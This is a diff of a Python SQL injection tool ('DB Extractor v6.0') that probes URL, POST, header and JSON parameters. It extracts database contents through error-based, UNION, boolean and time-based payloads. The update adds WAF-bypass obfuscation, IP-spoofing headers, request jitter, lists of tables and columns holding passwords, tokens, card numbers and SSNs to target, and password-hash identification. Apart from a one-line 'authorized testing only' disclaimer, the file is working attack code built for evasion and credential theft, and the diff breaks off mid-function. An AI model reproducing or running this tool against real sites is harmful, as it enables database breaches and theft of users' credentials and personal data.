@@ -1,40 +1,43 @@
 """
-DB Extractor v5.0 - UHQKYRA
+DB Extractor v6.0 — UHQKYRA
 =============================================================
-Ultra-reliable SQL injection detection + data extraction.
+⚠️  Authorized security testing only.
 
-HOW IT WORKS:
-  1. Tests ALL URL parameters (and POST params if provided)
-  2. For each param, tries multiple injection CONTEXTS:
-       numeric  : value AND 1=1--   vs  value AND 1=2--
-       string   : value' AND '1'='1  vs  value' AND '1'='2
-       dquote   : value" AND "1"="1  vs  value" AND "1"="2
-       paren    : value') AND ('1'='1  vs  value') AND ('1'='2
-  3. With multiple SUFFIXES: -- -  #  --  /*  %00
-  4. Detects injection via response length/content difference
-  5. Tries extraction techniques in order of reliability:
-       a) Error-based  (EXTRACTVALUE — works even without reflection)
-       b) UNION-based  (fast, needs reflected column)
-       c) Boolean blind (always works, slower)
-       d) Time-based   (last resort)
+Professional-grade SQL Injection detection + full data extraction.
+Built like a real pentester would use it.
 
-ERROR-BASED (most reliable for MySQL):
-  EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING(SQL,1,30), 0x7e))
-  → paginates with SUBSTRING(SQL, 1,30), SUBSTRING(SQL,31,30)...
-  → always works as long as there is SQL injection + MySQL
+TECHNIQUES (in order of preference):
+  1. Error-based  — EXTRACTVALUE / UPDATEXML / CAST (fast, reliable)
+  2. UNION-based  — column count detection + visible column injection
+  3. Boolean blind — binary search per char (thorough, slower)
+  4. Time-based   — SLEEP/WAITFOR/pg_sleep (last resort, slowest)
 
-UNION-BASED:
-  1. Detect column count via ORDER BY 1..N (content diff, not error)
-  2. Find reflected column via distinctive number 0x554851 ("UHQ")
-  3. Extract with CONCAT(0x5339, data, 0x4539) markers
+DATABASES SUPPORTED:
+  • MySQL 5.x / 8.x (primary)
+  • PostgreSQL 9+ (CAST error, pg_sleep)
+  • MSSQL / SQL Server (CONVERT error, WAITFOR)
+  • SQLite (load_extension, sqlite_master)
+  • Oracle (CTXSYS error, UTL_HTTP hint)
 
-SUPPORTED: MySQL (primary), PostgreSQL, MSSQL, SQLite, Oracle
+INJECTION VECTORS TESTED:
+  • GET parameters (all)
+  • POST parameters (all)
+  • HTTP Headers: User-Agent, Referer, X-Forwarded-For, X-Real-IP, Cookie values
+  • JSON body fields
+  • Stacked queries detection (timing-based confirmation)
+
+EVASION:
+  • Per-request UA rotation + IP spoof headers
+  • 8 WAF bypass SQL obfuscation variants
+  • Inline comment injection (/*!50000 ...*/), CHAR() encoding
+  • Configurable jitter between requests
 =============================================================
 """
 import re
 import time
 import random
 import threading
+import concurrent.futures
 import urllib.parse
 import warnings
 warnings.filterwarnings("ignore")
@@ -69,70 +72,171 @@ except ImportError:
         def jitter(*a, **kw): pass
         def obfuscate_sql(s, level=2): return s
         def sql_bypass_variants(p): return [("plain", p)]
+        def inject_sql_comments(s, intensity=0): return s
+        def obfuscate_keywords(s): return s
 
-# ─── Constants ───────────────────────────────────────────────────────────────
+# ─── Constants ────────────────────────────────────────────────────────────────
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-# Markers for UNION extraction — short, hex-safe, unlikely to appear naturally
-MARK_S = "S9S"   # start  (0x533953)
-MARK_E = "E9E"   # end    (0x453945)
-
-# Hex values for the markers
+# Extraction markers — short, hex-safe, unlikely in normal content
+MARK_S = "S9S"
+MARK_E = "E9E"
 HEX_MS = "0x533953"
 HEX_ME = "0x453945"
 
-# SQL error patterns
+# SQL error patterns (multi-DB)
 SQL_ERROR_PATTERNS = [
     r"you have an error in your sql syntax",
     r"warning.*?mysql",
-    r"mysql_fetch",
-    r"mysql_num_rows",
+    r"mysql_fetch", r"mysql_num_rows",
     r"supplied argument is not a valid mysql",
     r"unclosed quotation mark",
     r"quoted string not properly terminated",
-    r"pg_query\(\)",
-    r"pg_exec\(\)",
+    r"pg_query\(\)", r"pg_exec\(\)",
     r"ora-\d{4,5}",
     r"microsoft.*?odbc.*?sql",
     r"incorrect syntax near",
     r"mssql_query",
-    r"sqlite.*?error",
-    r"operationalerror.*?sqlite",
+    r"sqlite.*?error", r"operationalerror.*?sqlite",
     r"division by zero",
     r"column count doesn.*?match",
     r"the used select statements have a different number of columns",
-    r"unknown column",
-    r"table.*?doesn.*?exist",
-    r"unknown table",
-    r"sql syntax.*?near",
-    r"syntax error.*?near",
+    r"unknown column", r"table.*?doesn.*?exist",
     r"invalid column name",
     r"conversion failed when converting",
+    r"syntax error at or near",
+    r"invalid input syntax for",
+    r"unterminated string",
+    r"no column name was specified",
+    r"cannot insert.*?null",
+    r"arithmetic overflow",
 ]
 
-# EXTRACTVALUE error regex — extracts data from error message
-EXTRACT_RE = re.compile(r'~([^~]{1,200})~|XPATH syntax error: \'~?([^\']{1,200})~?\'', re.IGNORECASE)
+# EXTRACTVALUE / UPDATEXML error extractor
+EXTRACT_RE = re.compile(
+    r'~([^~]{1,250})~|XPATH syntax error: \'~?([^\']{1,250})~?\'|'
+    r'XPATH syntax error:([^<\n]{1,250})',
+    re.IGNORECASE
+)
 
-# DB type signatures
+# PostgreSQL CAST error extractor
+PG_CAST_RE = re.compile(
+    r'invalid input syntax for.*?(?:integer|numeric|bigint)[^"]*["\']([^"\']{1,250})["\']',
+    re.IGNORECASE
+)
+
+# MSSQL CONVERT error extractor
+MSSQL_CONV_RE = re.compile(
+    r'Conversion failed when converting.*?value \'([^\']{1,250})\'',
+    re.IGNORECASE
+)
+
+# DB type detection
 DB_SIGNATURES = {
-    "MySQL":      [r"you have an error in your sql syntax", r"warning.*?mysql", r"mysql_fetch", r"mysql_num_rows"],
-    "PostgreSQL": [r"pg_query\(\)", r"pg_exec\(\)", r"postgresql.*?error", r"org\.postgresql"],
-    "MSSQL":      [r"microsoft.*?odbc.*?sql", r"incorrect syntax near", r"mssql_query", r"unclosed quotation mark"],
-    "Oracle":     [r"ora-\d{4,5}", r"oracle.*?error", r"quoted string not properly terminated"],
-    "SQLite":     [r"sqlite.*?error", r"operationalerror.*?sqlite"],
+    "MySQL": [
+        r"you have an error in your sql syntax",
+        r"warning.*?mysql", r"mysql_fetch",
+        r"mysql_num_rows", r"mariadb",
+    ],
+    "PostgreSQL": [
+        r"pg_query\(\)", r"pg_exec\(\)",
+        r"postgresql.*?error", r"org\.postgresql",
+        r"syntax error at or near", r"invalid input syntax for",
+    ],
+    "MSSQL": [
+        r"microsoft.*?odbc.*?sql", r"incorrect syntax near",
+        r"mssql_query", r"unclosed quotation mark",
+        r"conversion failed", r"arithmetic overflow",
+    ],
+    "SQLite": [
+        r"sqlite.*?error", r"operationalerror.*?sqlite",
+        r"no such table", r"no such column",
+    ],
+    "Oracle": [
+        r"ora-\d{4,5}", r"oracle error",
+        r"oracle.*?driver", r"quoted string not properly terminated",
+    ],
 }
 
+# Sensitive tables to prioritize for dumping
 SENSITIVE_TABLES = [
     "users", "user", "admin", "admins", "accounts", "account",
     "members", "member", "customers", "customer", "login",
     "credentials", "auth", "authentication", "passwords", "password",
     "employees", "staff", "orders", "payments", "transactions",
     "emails", "messages", "tokens", "sessions", "config", "settings",
+    "secrets", "keys", "api_keys", "access_tokens", "refresh_tokens",
     "wp_users", "joomla_users", "jos_users", "drupal_users",
-    "phpbb_users", "vb_user", "smf_members",
+    "phpbb_users", "vb_user", "smf_members", "oc_users",
+    "tbladmin", "tbluser", "tbl_users", "tb_users",
+    "system_user", "root", "superuser",
 ]
 
-# ─── Helper functions ─────────────────────────────────────────────────────────
+# Sensitive column keywords (for prioritizing in dumps)
+SENSITIVE_COLS = [
+    "password", "passwd", "pass", "pwd", "hash", "secret",
+    "token", "key", "api_key", "auth", "salt", "2fa",
+    "email", "username", "user", "login", "admin",
+    "credit_card", "ssn", "dob", "phone", "address",
+]
+
+# HTTP headers that may be injectable
+INJECTABLE_HEADERS = [
+    "User-Agent",
+    "X-Forwarded-For",
+    "Referer",
+    "X-Real-IP",
+    "X-Custom-Header",
+    "CF-Connecting-IP",
+    "True-Client-IP",
+    "X-Originating-IP",
+    "Client-IP",
+]
+
+
+# ─── Hash identification ──────────────────────────────────────────────────────
+
+def _identify_hash(val):
+    """Identify common password hash types"""
+    if not val:
+        return None
+    val = val.strip()
+    if re.match(r'^\$2[aby]\$\d{2}\$', val):
+        return "bcrypt"
+    if re.match(r'^\$P\$', val):
+        return "WordPress (phpass)"
+    if re.match(r'^\$1\$', val):
+        return "MD5-crypt"
+    if re.match(r'^\$6\$', val):
+        return "SHA-512 crypt"
+    if re.match(r'^\$5\$', val):
+        return "SHA-256 crypt"
+    if re.match(r'^\$apr1\$', val):
+        return "Apache MD5"
+    if re.match(r'^\*[0-9A-F]{40}$', val):
+        return "MySQL SHA1"
+    if re.match(r'^[0-9a-f]{128}$', val, re.I):
+        return "SHA-512"
+    if re.match(r'^[0-9a-f]{64}$', val, re.I):
+        return "SHA-256"
+    if re.match(r'^[0-9a-f]{56}$', val, re.I):
+        return "SHA-224"
+    if re.match(r'^[0-9a-f]{40}$', val, re.I):
+        return "SHA-1"
+    if re.match(r'^[0-9a-f]{32}$', val, re.I):
+        return "MD5"
+    if re.match(r'^[0-9a-f]{16}$', val, re.I):
+        return "MySQL OLD"
+    if re.match(r'^[A-Za-z0-9+/]{43}=$', val):
+        return "SHA-256 base64"
+    if re.match(r'^[A-Za-z0-9+/]{60}={0,2}$', val):
+        return "SHA-384 base64"
+    if re.match(r'^[A-Za-z0-9+/]{86}={0,2}$', val):
+        return "SHA-512 base64"
+    return None
+
+
+# ─── Helpers ─────────────────────────────────────────────────────────────────
 
 def _has_sql_error(text):
     t = (text or "").lower()
@@ -148,90 +252,151 @@ def _detect_db_from_error(text):
 
 
 def _extract_error_value(text):
-    """Extract data from EXTRACTVALUE/UPDATEXML error message"""
+    """Extract data from EXTRACTVALUE/UPDATEXML error"""
     if not text:
         return None
     m = EXTRACT_RE.search(text)
     if m:
-        val = (m.group(1) or m.group(2) or "").strip("~").strip()
-        if val and val != "1":
+        val = (m.group(1) or m.group(2) or m.group(3) or "").strip("~").strip()
+        if val and val not in ("1", ""):
             return val
     return None
 
 
-def _responses_differ(r1_text, r2_text, threshold=0.06):
-    """Returns True if responses are significantly different"""
-    if r1_text is None or r2_text is None:
+def _extract_pg_cast(text):
+    """Extract data from PostgreSQL CAST type error"""
+    if not text:
+        return None
+    m = PG_CAST_RE.search(text)
+    if m:
+        return m.group(1).strip()
+    return None
+
+
+def _extract_mssql_convert(text):
+    """Extract data from MSSQL CONVERT error"""
+    if not text:
+        return None
+    m = MSSQL_CONV_RE.search(text)
+    if m:
+        return m.group(1).strip()
+    return None
+
+
+def _responses_differ(r1, r2, threshold=0.06):
+    """True if responses are significantly different in length"""
+    if r1 is None or r2 is None:
         return True
-    l1, l2 = len(r1_text), len(r2_text)
+    l1, l2 = len(r1), len(r2)
     if l1 == 0 and l2 == 0:
         return False
     diff = abs(l1 - l2) / max(l1, l2, 1)
+    # Also check for keyword presence changes
+    for kw in ["error", "warning", "not found", "access denied", "invalid"]:
+        if (kw in r1.lower()) != (kw in r2.lower()):
+            return True
     return diff > threshold
 
 
-# ─── Core class ───────────────────────────────────────────────────────────────
+def _content_differs(r1, r2, threshold=0.04):
+    """Stricter content comparison including text similarity"""
+    if _responses_differ(r1, r2, threshold):
+        return True
+    # Additional check: significant word set difference
+    try:
+        w1 = set(r1.lower().split())
+        w2 = set(r2.lower().split())
+        if not w1 or not w2:
+            return False
+        jaccard = len(w1 & w2) / len(w1 | w2)
+        return jaccard < 0.85
+    except Exception:
+        return False
+
+
+# ─── Core Injector Class ──────────────────────────────────────────────────────
 
 class SQLInjector:
     """
-    Full SQLi detection + extraction engine.
+    Professional SQL Injection detection + extraction engine v6.0.
 
-    Quick start:
-        inj = SQLInjector("http://site.com/page.php?id=1", callback=cb)
+    Usage:
+        inj = SQLInjector("http://target.com/page.php?id=1", callback=cb)
         if inj.find_injection():
+            inj.setup_technique()
             info = inj.extract_info()
             tables = inj.extract_tables()
+            creds = inj.extract_credentials()
     """
 
-    # (context_name, true_template, false_template)
-    # {V} = original value, {S} = suffix
+    # (name, true_template, false_template)
+    # {V}=original value, {S}=suffix
     CONTEXTS = [
-        ("numeric",  "{V} AND 1=1{S}",          "{V} AND 1=2{S}"),
-        ("numeric2", "{V} AND 1=1--",            "{V} AND 1=2--"),
-        ("string1",  "{V}' AND '1'='1{S}",       "{V}' AND '1'='2{S}"),
-        ("string2",  "{V}' AND 1=1{S}",          "{V}' AND 1=2{S}"),
-        ("dquote",   '{V}" AND "1"="1{S}',       '{V}" AND "1"="2{S}'),
-        ("paren1",   "{V}') AND ('1'='1{S}",     "{V}') AND ('1'='2{S}"),
-        ("paren2",   "{V}') AND 1=1{S}",         "{V}') AND 1=2{S}"),
-        ("str_or",   "{V}' OR '1'='1{S}",        "{V}' OR '1'='2{S}"),
-        ("num_or",   "{V} OR 1=1{S}",            "{V} OR 1=2{S}"),
+        # Numeric
+        ("numeric",    "{V} AND 1=1{S}",           "{V} AND 1=2{S}"),
+        ("numeric_or", "{V} OR 1=1{S}",            "{V} OR 1=2{S}"),
+        ("num_paren1", "{V}) AND (1=1{S}",          "{V}) AND (1=2{S}"),
+        ("num_paren2", "{V}) AND 1=1{S}",           "{V}) AND 1=2{S}"),
+        ("num_paren3", "{V})) AND ((1=1{S}",        "{V})) AND ((1=2{S}"),
+        # Single-quote string
+        ("string1",    "{V}' AND '1'='1{S}",        "{V}' AND '1'='2{S}"),
+        ("string2",    "{V}' AND 1=1{S}",            "{V}' AND 1=2{S}"),
+        ("str_or",     "{V}' OR '1'='1{S}",          "{V}' OR '1'='2{S}"),
+        ("str_paren1", "{V}') AND ('1'='1{S}",       "{V}') AND ('1'='2{S}"),
+        ("str_paren2", "{V}') AND (1=1{S}",          "{V}') AND (1=2{S}"),
+        ("str_paren3", "{V}')) AND (('1'='1{S}",     "{V}')) AND (('1'='2{S}"),
+        # Double-quote string
+        ("dquote",     '{V}" AND "1"="1{S}',         '{V}" AND "1"="2{S}'),
+        ("dq_paren",   '{V}") AND ("1"="1{S}',       '{V}") AND ("1"="2{S}'),
+        # Arithmetic (good for WAF bypass)
+        ("arith_add",  "{V}+0{S}",                   "{V}+1e9{S}"),
+        ("arith_sub",  "{V}-0{S}",                   "{V}-1e9{S}"),
+        # Comment-based (MySQL /*!*/ trick)
+        ("cmt_num",    "{V}/*!AND*/1=1{S}",           "{V}/*!AND*/1=2{S}"),
     ]
 
-    SUFFIXES = ["-- -", "#", "--", "-- ", " --", "/*", "  "]
+    SUFFIXES = [
+        "-- -", "#", "--", "-- ", " -- ", "/*", "%00",
+        "; --", "%23", "-- comment", "\n--", "\r\n--",
+    ]
 
     def __init__(self, url, param=None, method="GET", post_data=None,
-                 cookies=None, headers=None, callback=None, timeout=12):
-        self.url       = url
-        self.param     = param        # None = test all params
-        self.method    = method.upper()
-        self.post_data = dict(post_data or {})
-        self.cookies   = dict(cookies or {})
-        self.extra_hdr = dict(headers or {})
-        self.cb_fn     = callback
-        self.timeout   = timeout
+                 cookies=None, headers=None, callback=None, timeout=12,
+                 test_headers=False):
+        self.url           = url
+        self.param         = param
+        self.method        = method.upper()
+        self.post_data     = dict(post_data or {})
+        self.cookies       = dict(cookies or {})
+        self.extra_hdr     = dict(headers or {})
+        self.cb_fn         = callback
+        self.timeout       = timeout
+        self.test_headers  = test_headers  # also test HTTP headers as vectors
 
-        # session
         self.session = requests.Session() if HAS_REQUESTS else None
 
-        # discovered injection point
+        # Discovered injection state
         self.inj_param   = None
-        self.inj_ctx     = None   # context name
-        self.inj_true    = None   # true payload template
-        self.inj_false   = None   # false payload template
+        self.inj_ctx     = None
+        self.inj_true    = None
+        self.inj_false   = None
         self.inj_suffix  = None
         self.inj_method  = "GET"
+        self.inj_is_header = False   # True if injection is in a header
+        self.inj_header  = None      # Which header
 
-        # extraction setup
-        self.technique   = None   # "error" | "union" | "blind" | "time"
+        # Extraction state
+        self.technique   = None
         self.db_type     = "MySQL"
         self.num_cols    = 0
-        self.vis_col     = -1     # 0-indexed
+        self.vis_col     = -1
+        self._err_fn     = "EXTRACTVALUE"
 
-        # baselines
-        self._baseline   = None   # response text of normal request
-        self._err_pg     = None   # response text of obvious-error request
+        # Baselines
+        self._baseline   = None
+        self._orig_val   = None
 
-        # parse URL
+        # Parse URL
         self._parsed = urllib.parse.urlparse(url if "://" in url else "http://" + url)
         self._qs     = dict(urllib.parse.parse_qsl(self._parsed.query, keep_blank_values=True))
 
@@ -240,24 +405,24 @@ class SQLInjector:
         if self.cb_fn:
             self.cb_fn({"type": t, "message": m})
 
-    # ── Raw request ──────────────────────────────────────────────────────────
-    def _req(self, payload, param=None, method=None, extra_qs=None):
-        """Send request with payload injected into param — stealth headers, jitter."""
+    # ── Request ──────────────────────────────────────────────────────────────
+    def _req(self, payload, param=None, method=None, extra_qs=None, hdr_inject=None):
+        """Send request with payload + stealth headers + jitter"""
         if not self.session:
             return ""
         p = param or self.inj_param
-        m = method or self.inj_method or self.method
-        # Build stealth headers (new random UA + IP spoof + referrer per request)
+        m = (method or self.inj_method or self.method).upper()
         hdrs = random_headers(include_ip_spoof=True, include_referrer=True)
-        hdrs.update(self.extra_hdr)   # caller overrides last
-        # Jitter to avoid rate-limit triggers
+        hdrs.update(self.extra_hdr)
+        if hdr_inject:
+            hdrs.update(hdr_inject)
         burst_jitter()
         try:
             if m == "GET":
                 qs = dict(self._qs)
                 if extra_qs:
                     qs.update(extra_qs)
-                if p:
+                if p and not hdr_inject:
                     qs[p] = payload
                 base = self._parsed._replace(query="").geturl()
                 r = self.session.get(base, params=qs, timeout=self.timeout,
@@ -265,7 +430,7 @@ class SQLInjector:
                                      cookies=self.cookies, allow_redirects=True)
             else:
                 data = dict(self.post_data)
-                if p:
+                if p and not hdr_inject:
                     data[p] = payload
                 r = self.session.post(self.url, data=data, timeout=self.timeout,
                                       verify=False, headers=hdrs,
@@ -274,151 +439,244 @@ class SQLInjector:
         except Exception:
             return ""
 
-    def _req_raw(self, url, method="GET", params=None, data=None):
-        """Raw request with explicit URL/params — stealth headers."""
+    def _req_hdr(self, header_name, payload):
+        """Inject payload into a specific HTTP header"""
         if not self.session:
             return ""
         hdrs = random_headers(include_ip_spoof=True, include_referrer=False)
         hdrs.update(self.extra_hdr)
+        hdrs[header_name] = payload
+        burst_jitter()
         try:
-            if method == "GET":
-                r = self.session.get(url, params=params, timeout=self.timeout,
-                                     verify=False, headers=hdrs,
-                                     cookies=self.cookies, allow_redirects=True)
-            else:
-                r = self.session.post(url, data=data, timeout=self.timeout,
-                                      verify=False, headers=hdrs,
-                                      cookies=self.cookies, allow_redirects=True)
+            base = self._parsed._replace(query="").geturl()
+            qs = dict(self._qs)
+            r = self.session.get(base, params=qs, timeout=self.timeout,
+                                 verify=False, headers=hdrs,
+                                 cookies=self.cookies, allow_redirects=True)
             return r.text
         except Exception:
             return ""
 
-    # ── Injection payload builder ─────────────────────────────────────────────
+    def _req_payload(self, payload):
+        """Send with prebuilt payload"""
+        if self.inj_is_header:
+            return self._req_hdr(self.inj_header, payload)
+        return self._req(payload, param=self.inj_param, method=self.inj_method)
+
+    # ── Payload building ─────────────────────────────────────────────────────
     def _build(self, template, orig_val, suffix):
         return template.replace("{V}", str(orig_val)).replace("{S}", suffix)
 
-    # ── Find injection point ──────────────────────────────────────────────────
-    def find_injection(self):
-        """
-        Test all URL (and POST) parameters for SQLi.
-        Returns True if at least one injection point found.
-        Sets self.inj_param, self.inj_ctx, self.inj_true, self.inj_false, self.inj_suffix
-        """
-        if not self.session:
-            return False
-
-        # Build list of params to test
-        params_to_test = []
-        if self.param:
-            # User specified a param: use it (also as POST)
-            val = self._qs.get(self.param) or self.post_data.get(self.param) or "1"
-            params_to_test.append(("GET", self.param, val))
-        else:
-            # Test ALL URL params
-            for k, v in self._qs.items():
-                params_to_test.append(("GET", k, v))
-            # Test POST params
-            for k, v in self.post_data.items():
-                params_to_test.append(("POST", k, v))
-
-        if not params_to_test:
-            # No params found — try adding id=1
-            self._cb("warn", "🗄️ Aucun paramètre URL trouvé — test avec id=1")
-            params_to_test.append(("GET", "id", "1"))
-
-        self._cb("info", f"🗄️ Test de {len(params_to_test)} paramètre(s) pour SQLi...")
-
-        for method, param, orig_val in params_to_test:
-            self._cb("info", f"🗄️ Test param: {param}={orig_val} [{method}]")
-
-            # 1) Quick error probe: send a single quote
-            self.inj_param  = param
-            self.inj_method = method
-            quote_resp = self._req(str(orig_val) + "'")
-            if _has_sql_error(quote_resp):
-                self.db_type = _detect_db_from_error(quote_resp)
-                self._cb("found", f"🗄️ Erreur SQL sur param '{param}' avec quote — DB: {self.db_type}")
-
-            # 2) Get baseline
-            baseline = self._req(str(orig_val))
-            self._baseline = baseline
-
-            # 3) Try each context × suffix
-            for ctx_name, true_tpl, false_tpl in self.CONTEXTS:
-                for suffix in self.SUFFIXES:
-                    true_pay  = self._build(true_tpl,  orig_val, suffix)
-                    false_pay = self._build(false_tpl, orig_val, suffix)
-
-                    true_resp  = self._req(true_pay,  param=param, method=method)
-                    false_resp = self._req(false_pay, param=param, method=method)
-
-                    if not true_resp or not false_resp:
-                        continue
-
-                    # Condition: true≈baseline AND false≠baseline
-                    true_like_base  = not _responses_differ(baseline, true_resp, threshold=0.05)
-                    false_diff_base = _responses_differ(baseline, false_resp, threshold=0.05)
-                    true_diff_false = _responses_differ(true_resp, false_resp, threshold=0.04)
-
-                    if (true_like_base and false_diff_base) or true_diff_false:
-                        self._cb("found", f"🗄️ ✅ SQLi détectée! param='{param}' ctx={ctx_name} suf='{suffix}'")
-                        self.inj_param  = param
-                        self.inj_method = method
-                        self.inj_ctx    = ctx_name
-                        self.inj_true   = true_tpl
-                        self.inj_false  = false_tpl
-                        self.inj_suffix = suffix
-                        self._baseline  = baseline
-                        self._orig_val  = str(orig_val)   # ← store for all sub-methods
-                        return True
-
-        self._cb("warn", "🗄️ Aucune injection détectée sur les paramètres testés")
-        return False
-
-    # ── Injection wrapper (uses discovered context) ───────────────────────────
     def _ov(self):
-        """Return stored original value, with fallback"""
-        if hasattr(self, "_orig_val") and self._orig_val is not None:
+        if self._orig_val is not None:
             return self._orig_val
         return (self._qs.get(self.inj_param)
                 or self.post_data.get(self.inj_param, "")
                 or "1")
 
     def _quote(self):
-        """Derive quote char from discovered injection context"""
         ctx = self.inj_ctx or "string1"
-        if "num" in ctx:
+        if "num" in ctx or "arith" in ctx or "cmt" in ctx:
             return ""
-        if "dquote" in ctx:
+        if "dquote" in ctx or "dq_" in ctx:
             return '"'
-        if "paren" in ctx:
+        if "paren" in ctx and "str" in ctx:
             return "')"
-        return "'"   # default: string contexts
+        if "paren" in ctx and "dq_" in ctx:
+            return '")'
+        return "'"
 
     def _wrap(self, injection):
-        """
-        Build a full injectable payload using the discovered context.
-        e.g.: '1' UNION SELECT ...-- -'  (for string1 context)
-        """
+        """Wrap injection in discovered context"""
         ov  = self._ov()
         q   = self._quote()
         suf = self.inj_suffix or "-- -"
         return f"{ov}{q} {injection}{suf}"
 
     def _wrap_neg(self, injection):
-        """Like _wrap but replaces orig_val with -1 to suppress original row"""
+        """Use -1 to suppress original row (for UNION)"""
         q   = self._quote()
         suf = self.inj_suffix or "-- -"
         return f"-1{q} {injection}{suf}"
 
-    # ── Column count ─────────────────────────────────────────────────────────
+    # ── Injection finding ────────────────────────────────────────────────────
+    def find_injection(self):
+        """
+        Test all URL + POST parameters (and optionally HTTP headers) for SQLi.
+        Returns True if injection found.
+        """
+        if not self.session:
+            return False
+
+        # Build param list
+        params_to_test = []
+        if self.param:
+            val = self._qs.get(self.param) or self.post_data.get(self.param) or "1"
+            params_to_test.append(("GET", self.param, val))
+        else:
+            for k, v in self._qs.items():
+                params_to_test.append(("GET", k, v))
+            for k, v in self.post_data.items():
+                params_to_test.append(("POST", k, v))
+
+        if not params_to_test:
+            self._cb("warn", "🗄️ Aucun paramètre URL — test avec id=1")
+            params_to_test.append(("GET", "id", "1"))
+
+        self._cb("info", f"🗄️ Test {len(params_to_test)} paramètre(s) pour SQLi...")
+
+        for method, param, orig_val in params_to_test:
+            if self._test_param(method, param, str(orig_val)):
+                return True
+
+        # Also test HTTP headers if requested or no params found
+        if self.test_headers or not params_to_test:
+            self._cb("info", "🗄️ Test injection dans les headers HTTP...")
+            if self._test_header_injection():
+                return True
+
+        # Test JSON body
+        if self.post_data:
+            self._cb("info", "🗄️ Test injection JSON...")
+            if self._test_json_injection():
+                return True
+
+        self._cb("warn", "🗄️ Aucune injection SQL détectée sur ce point d'entrée")
+        return False
+
+    def _test_param(self, method, param, orig_val):
+        """Test a single parameter for SQLi"""
+        self._cb("info", f"🗄️   [{method}] {param}={orig_val[:30]}")
+
+        # Quick error probe
+        self.inj_param  = param
+        self.inj_method = method
+        self.inj_is_header = False
+        quote_resp = self._req(str(orig_val) + "'", param=param, method=method)
+        if _has_sql_error(quote_resp):
+            self.db_type = _detect_db_from_error(quote_resp)
+            self._cb("found", f"🗄️ Erreur SQL via quote sur '{param}' — DB: {self.db_type}")
+
+        baseline = self._req(str(orig_val), param=param, method=method)
+        self._baseline = baseline
+
+        for ctx_name, true_tpl, false_tpl in self.CONTEXTS:
+            for suffix in self.SUFFIXES:
+                true_pay  = self._build(true_tpl,  orig_val, suffix)
+                false_pay = self._build(false_tpl, orig_val, suffix)
+                true_r    = self._req(true_pay,  param=param, method=method)
+                false_r   = self._req(false_pay, param=param, method=method)
+                if not true_r or not false_r:
+                    continue
+
+                true_like  = not _responses_differ(baseline, true_r,  threshold=0.05)
+                false_diff = _responses_differ(baseline, false_r, threshold=0.05)
+                tf_diff    = _responses_differ(true_r,   false_r, threshold=0.04)
+
+                if (true_like and false_diff) or tf_diff:
+                    self._cb("found",
+                             f"🗄️ ✅ SQLi! param='{param}' ctx={ctx_name} suf='{suffix}'")
+                    self.inj_param  = param
+                    self.inj_method = method
+                    self.inj_ctx    = ctx_name
+                    self.inj_true   = true_tpl
+                    self.inj_false  = false_tpl
+                    self.inj_suffix = suffix
+                    self._baseline  = baseline
+                    self._orig_val  = str(orig_val)
+                    return True
+        return False
+
+    def _test_header_injection(self):
+        """Test HTTP headers as injection vectors"""
+        orig_val = "Mozilla/5.0"
+        for header in INJECTABLE_HEADERS:
+            baseline = self._req_hdr(header, orig_val)
+            if not baseline:
+                continue
+            # Quick error probe
+            quote_resp = self._req_hdr(header, orig_val + "'")
+            if _has_sql_error(quote_resp):
+                self.db_type = _detect_db_from_error(quote_resp)
+                self._cb("found", f"🗄️ Erreur SQL dans header '{header}'!")
+
+            # Boolean test
+            for suffix in ["-- -", "#", "--"]:
+                true_pay  = f"{orig_val}' AND '1'='1{suffix}"
+                false_pay = f"{orig_val}' AND '1'='2{suffix}"
+                true_r  = self._req_hdr(header, true_pay)
+                false_r = self._req_hdr(header, false_pay)
+                if not true_r or not false_r:
+                    continue
+                if _responses_differ(true_r, false_r, 0.04):
+                    self._cb("found", f"🗄️ ✅ SQLi dans header '{header}'!")
+                    self.inj_is_header = True
+                    self.inj_header    = header
+                    self.inj_ctx       = "string1"
+                    self.inj_true      = "{V}' AND '1'='1{S}"
+                    self.inj_false     = "{V}' AND '1'='2{S}"
+                    self.inj_suffix    = suffix
+                    self._orig_val     = orig_val
+                    self._baseline     = baseline
+                    return True
+        return False
+
+    def _test_json_injection(self):
+        """Test JSON body fields for SQLi"""
+        if not self.session:
+            return False
+        for field, orig in self.post_data.items():
+            try:
+                hdrs = random_headers()
+                hdrs["Content-Type"] = "application/json"
+                import json as _json
+                # Boolean test
+                for suffix in ["-- -", "#"]:
+                    p_true  = {field: str(orig) + f"' AND '1'='1{suffix}"}
+                    p_false = {field: str(orig) + f"' AND '1'='2{suffix}"}
+                    r_true  = self.session.post(
+                        self.url, data=_json.dumps(p_true), headers=hdrs,
+                        timeout=self.timeout, verify=False, cookies=self.cookies)
+                    r_false = self.session.post(
+                        self.url, data=_json.dumps(p_false), headers=hdrs,
+                        timeout=self.timeout, verify=False, cookies=self.cookies)
+                    if r_true and r_false and _responses_differ(r_true.text, r_false.text, 0.04):
+                        self._cb("found", f"🗄️ ✅ SQLi JSON dans field '{field}'!")
+                        self.inj_param  = field
+                        self.inj_method = "POST"
+                        self.inj_ctx    = "string1"
+                        self.inj_true   = "{V}' AND '1'='1{S}"
+                        self.inj_false  = "{V}' AND '1'='2{S}"
+                        self.inj_suffix = suffix
+                        self._orig_val  = str(orig)
+                        return True
+            except Exception:
+                continue
+        return False
+
+    # ── Stacked queries detection ─────────────────────────────────────────────
+    def detect_stacked_queries(self):
+        """Detect stacked queries via timing (non-destructive: sleep only)"""
+        self._cb("info", "🗄️ Test stacked queries (timing)...")
+        for sleep_payload in [
+            f"{self._ov()}'; SELECT SLEEP(2)-- -",
+            f"{self._ov()}'; WAITFOR DELAY '0:0:2'-- -",
+            f"{self._ov()}'; SELECT pg_sleep(2)-- -",
+        ]:
+            t0 = time.time()
+            self._req_payload(sleep_payload)
+            elapsed = time.time() - t0
+            if elapsed >= 1.8:
+                self._cb("found", f"🗄️ ✅ Stacked queries! ({elapsed:.1f}s) — batch execution possible")
+                return True
+        return False
+
+    # ── Column detection ─────────────────────────────────────────────────────
     def _detect_cols_orderby(self):
-        """ORDER BY N — detect column count using discovered injection context"""
-        # Reference: ORDER BY 1 always succeeds
+        """ORDER BY N — binary search for column count"""
         ref = self._req_payload(self._wrap("ORDER BY 1"))
         if not ref:
             ref = self._baseline or ""
-
         for n in range(2, 26):
             resp = self._req_payload(self._wrap(f"ORDER BY {n}"))
             if not resp:
@@ -430,95 +688,110 @@ class SQLInjector:
         return 0
 
     def _detect_cols_union(self):
-        """UNION SELECT NULL×N — find count with discovered context"""
+        """UNION SELECT NULL×N — find column count"""
         for n in range(1, 26):
